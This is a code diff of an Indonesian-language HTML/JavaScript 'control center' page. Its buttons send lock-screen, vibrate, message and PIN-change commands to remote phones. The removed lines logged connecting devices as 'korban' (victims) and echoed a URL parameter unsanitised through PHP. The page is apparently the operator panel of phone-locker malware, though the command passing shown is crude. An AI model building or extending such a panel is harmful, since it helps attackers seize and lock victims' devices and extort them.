@@ -15,14 +15,10 @@ input{padding:10px; width:150px; background:#222; border:1px solid #0f0; color:#
 
 <h1>=== CONTROL CENTER ===</h1>
 
-<h2>🔌 DEVICE ONLINE:</h2>
-<div id="deviceList">Menunggu koneksi...</div>
-
-<h2>⚡ CONTROL LOCK:</h2>
+<h2>⚡ KIRIM PERINTAH:</h2>
 <button class="btn" onclick="kirim('LOCK_SCREEN_ON')">🔴 LOCK ON</button>
 <button class="btn btn-green" onclick="kirim('LOCK_SCREEN_OFF')">🟢 LOCK OFF</button>
-
-<h2>⚡ FITUR LAIN:</h2>
+<br><br>
 <button class="btn" onclick="kirim('VIBRATE')">📳 GETAR</button>
 <br><br>
 
@@ -34,53 +30,32 @@ input{padding:10px; width:150px; background:#222; border:1px solid #0f0; color:#
 <button class="btn" style="background:blue" onclick="gantiPin()">🔑 GANTI PIN</button>
 
 <script>
-// SIMPAN DATA DI LOCALSTORAGE (GANTI PHP)
-function saveData(){
-    let device = "HP: " + navigator.userAgent;
-    let time = new Date().toLocaleTimeString();
-    let data = localStorage.getItem("log") || "";
-    localStorage.setItem("log", "["+time+"] | "+device+"\n"+data);
-    tampilData();
-}
-
-function tampilData(){
-    document.getElementById("deviceList").innerHTML = localStorage.getItem("log") || "Belum ada korban";
-}
-
-// KIRIM PERINTAH (SIMPAN DI FILE COMMAND VIA URL)
 function kirim(perintah){
-    // Kita simpan perintah di parameter URL biar kebaca
-    let url = window.location.href + "?cmd=" + perintah;
-    history.pushState({}, "", url);
-    alert("Perintah: " + perintah + " DIKIRIM!");
+    // Kita tulis perintah di URL bar
+    window.location.href = "panel.html#" + perintah;
+    alert("TERKIRIM: " + perintah);
 }
-
 function kirimPesan(){
-    let teks = document.getElementById("pesan").value;
-    kirim("MSG:"+teks);
+    let t = document.getElementById('pesan').value;
+    kirim("MSG:"+t);
 }
-
 function gantiPin(){
-    let pin = document.getElementById("pinbaru").value;
-    if(pin.length == 4){
-        kirim("SETPIN:"+pin+"|");
-    }else{
-        alert("PIN HARUS 4 ANGKA!");
-    }
-}
-
-// LOAD
-window.onload = function(){
-    tampilData();
-    // Auto save data dummy
-    saveData();
+    let p = document.getElementById('pinbaru').value;
+    if(p.length==4) kirim("SETPIN:"+p+"|");
+    else alert("PIN 4 ANGKA!");
 }
 </script>
 
-<!-- AREA UNTUK BACA PERINTAH -->
-<div id="cmdArea" style="display:none">
-<?php if(isset($_GET['cmd'])) echo $_GET['cmd']; ?>
+<!-- AREA SIMPAN PERINTAH -->
+<div id="output" style="display:none">
+    <span id="cmdText"></span>
 </div>
+
+<script>
+    // Tampilkan perintah di kode sumber
+    let cmd = window.location.hash.replace("#", "");
+    document.getElementById("cmdText").innerText = cmd;
+</script>
 
 </body>
 </html>
